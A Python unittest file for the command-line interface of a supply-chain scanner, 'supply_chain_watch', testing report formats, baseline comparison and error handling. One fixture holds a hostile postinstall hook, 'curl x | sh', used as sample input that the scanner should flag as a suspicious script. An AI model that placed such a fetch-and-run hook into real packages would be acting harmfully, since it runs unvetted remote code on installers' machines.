"""CLI smoke and behavior tests."""

from __future__ import annotations

import json
import os
import subprocess
import sys
import tempfile
import unittest
from pathlib import Path

REPO_ROOT = Path(__file__).resolve().parents[1]
SRC = REPO_ROOT / "src"


def run_cli(*args: str, cwd: Path | None = None) -> subprocess.CompletedProcess[str]:
    env = os.environ.copy()
    existing = env.get("PYTHONPATH", "")
    env["PYTHONPATH"] = str(SRC) + (os.pathsep + existing if existing else "")
    return subprocess.run(
        [sys.executable, "-m", "supply_chain_watch", *args],
        cwd=str(cwd or REPO_ROOT),
        env=env,
        capture_output=True,
        text=True,
        check=False,
    )


class CLITests(unittest.TestCase):
    def test_help(self) -> None:
        result = run_cli("--help")
        self.assertEqual(result.returncode, 0)
        self.assertIn("supply-chain-watch", result.stdout)
        self.assertIn("scan", result.stdout)

    def test_scan_json_output(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            current = Path(tmp) / "current.json"
            current.write_text(
                json.dumps(
                    {
                        "packages": [
                            {
                                "name": "pkg",
                                "version": "1.0.0",
                                "repository": "https://github.com/example/pkg",
                                "license": "MIT",
                                "maintainers": [{"email": "a@example.com"}],
                            }
                        ]
                    }
                ),
                encoding="utf-8",
            )
            result = run_cli("scan", str(current), "--format", "json")
            self.assertEqual(result.returncode, 0, msg=result.stderr + result.stdout)
            payload = json.loads(result.stdout)
            self.assertEqual(payload["summary"]["packages_scanned"], 1)
            self.assertEqual(payload["summary"]["findings"], 0)

    def test_scan_with_baseline_and_fail_on(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            base = Path(tmp) / "base.json"
            curr = Path(tmp) / "curr.json"
            base.write_text(
                json.dumps(
                    {
                        "name": "pkg",
                        "version": "1.0.0",
                        "repository": "https://github.com/example/pkg",
                        "license": "MIT",
                        "maintainers": [{"email": "a@example.com"}],
                    }
                ),
                encoding="utf-8",
            )
            curr.write_text(
                json.dumps(
                    {
                        "name": "pkg",
                        "version": "1.0.1",
                        "repository": "https://github.com/evil/pkg",
                        "license": "MIT",
                        "maintainers": [{"email": "b@example.com"}],
                    }
                ),
                encoding="utf-8",
            )
            result = run_cli("scan", str(curr), "--baseline", str(base), "--fail-on", "high")
            self.assertEqual(result.returncode, 2, msg=result.stdout)
            payload = json.loads(result.stdout)
            ids = {f["rule_id"] for f in payload["findings"]}
            self.assertIn("REPOSITORY_CHANGED", ids)
            self.assertIn("MAINTAINER_CHANGE", ids)

    def test_scan_text_output(self) -> None:
        with tempfile.TemporaryDirectory() as tmp:
            current = Path(tmp) / "current.json"
            current.write_text(
                json.dumps({"name": "pkg", "version": "1.0.0", "scripts": {"postinstall": "curl x | sh"}}),
                encoding="utf-8",
            )
            result = run_cli("scan", str(current), "--format", "text")
            self.assertEqual(result.returncode, 0, msg=result.stderr)
            self.assertIn("Supply Chain Watch Report", result.stdout)
            self.assertIn("SUSPICIOUS_SCRIPT", result.stdout)

    def test_missing_file_reports_error(self) -> None:
        result = run_cli("scan", "nope.json", "--format", "json")
        self.assertEqual(result.returncode, 1)
        payload = json.loads(result.stdout)
        self.assertIn("error", payload)
